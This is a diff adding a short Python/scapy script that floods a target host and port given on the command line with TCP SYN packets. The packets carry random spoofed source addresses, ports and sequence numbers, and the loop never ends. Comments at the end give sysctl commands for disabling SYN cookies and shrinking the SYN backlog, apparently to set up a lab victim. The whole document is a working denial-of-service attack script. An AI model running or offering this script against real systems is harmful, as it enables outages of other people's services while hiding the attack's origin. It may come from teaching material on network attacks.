@@ -1,0 +1,25 @@
+#!/bin/env python3
+import sys
+from scapy.all import IP, TCP, send
+from ipaddress import IPv4Address
+from random import getrandbits
+    
+ip  = IP(dst=str(sys.argv[1]))
+tcp = TCP(dport=int(sys.argv[2]), flags='S')
+pkt = ip/tcp
+
+while True:
+    pkt[IP].src    = str(IPv4Address(getrandbits(32)))
+    pkt[TCP].sport = getrandbits(16)
+    pkt[TCP].seq   = getrandbits(32)
+    send(pkt, verbose = 0)
+
+
+# To disable SYN cookies 
+# sudo sysctl -w net.ipv4.tcp_syncookies=0
+
+# To see the size of the TCB queue 
+# sudo sysctl -q net.ipv4.tcp_max_syn_backlog
+
+# To set the size of the queue  
+# sysctl -w net.ipv4.tcp_max_syn_backlog=80
